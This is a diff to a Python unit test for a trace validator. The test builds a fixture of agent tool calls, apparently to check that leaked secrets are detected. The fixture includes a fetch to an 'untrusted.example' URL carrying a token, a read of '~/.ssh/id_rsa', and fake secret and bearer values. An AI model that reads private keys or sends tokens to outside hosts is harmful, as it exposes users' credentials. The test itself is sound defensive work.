@@ -152,7 +152,7 @@ class TestValidateTrace(unittest.TestCase):
             _write_jsonl(
                 p,
                 [
-                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:01Z", "event_type": "tool_call", "tool_call_id": "c1", "tool_name": "web_fetch", "arguments": {"url": "https://untrusted.example/page?token=abc123456789"}},
+                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:01Z", "event_type": "tool_call", "tool_call_id": "c1", "tool_name": "web_fetch", "arguments": {"url": "https://untrusted.example/page?token=" + "abc123456789"}},
                     {"trace_id": "t", "timestamp": "2026-01-01T00:00:02Z", "event_type": "tool_result", "tool_call_id": "c1", "output": f"body {fake_sk}"},
                     {"trace_id": "t", "timestamp": "2026-01-01T00:00:03Z", "event_type": "tool_call", "tool_call_id": "c2", "tool_name": "read_file", "arguments": {"path": "~/.ssh/id_rsa"}},
                     {"trace_id": "t", "timestamp": "2026-01-01T00:00:04Z", "event_type": "tool_result", "tool_call_id": "c2", "output": fake_bearer},
